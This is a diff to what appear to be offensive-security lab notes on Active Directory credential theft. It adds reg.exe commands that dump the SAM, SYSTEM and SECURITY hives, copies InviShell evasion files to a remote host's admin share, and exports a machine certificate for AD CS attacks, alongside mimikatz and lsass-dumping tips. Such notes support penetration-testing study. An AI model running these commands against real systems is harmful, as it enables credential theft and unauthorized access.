@@ -183,6 +183,32 @@ privilege::debug
 sekurlsa::ekeys
 </code></pre>
 
+* Use reg.exe
+
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>Dump registry hives
+</strong>reg save HKLM\SECURITY c:\test\security.bak &#x26;&#x26; reg save HKLM\SYSTEM c:\test\system.bak &#x26;&#x26; reg save HKLM\SAM c:\test\sam.bak
+Dump the hashes with samdump2 on kali
+
+<strong>
+</strong></code></pre>
+
+* Check for certificates
+
+{% code overflow="wrap" %}
+```powershell
+echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\usjump\C$\Users\Public\RunWithRegistryNonAdmin.bat /Y
+echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\us-jump\C$\Users\Public\InShellProf.dll /y
+
+ls cert:\LocalMachine\My
+Try to export the certificate: ls
+ls cert:\LocalMachine\My\89C1171F6810A6725A47DB8D572537D736D4FF17 | Export-PfxCertificate -FilePath C:\Users\Public\pawadmin.pfx -Password (ConvertTo-SecureString -String 'YourPassword123' -Force -AsPlainText)
+```
+{% endcode %}
+
+Use in AD CS Attacks, see Lab 17
+
+
+
 * Dump lsass with taskmanager if we have rdp accesss
 * Use other Lolbins // msbuild, rundll32, regsvc
 
